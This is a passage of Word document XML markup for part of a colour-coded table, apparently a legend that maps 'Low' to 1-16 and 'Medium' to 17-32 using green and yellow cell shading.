              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Low</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="420" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="520" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="760" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="00B050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>1-16</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="120" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2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58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44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100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="36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30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="101"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="00B050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="300" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="260" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1360" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="00B050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="420" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="520" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="760" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="00B050"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="120" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="00B050"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2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58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44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100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="36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30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="301"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FFFF00"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="300" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>M</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="260" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1360" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FFFF00"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="420" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="520" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="760" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FFFF00"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>17-32</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="120" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2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58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44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100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="36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30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="101"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FFFF00"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="300" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="260" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFF00"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1360" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:tcBorders>
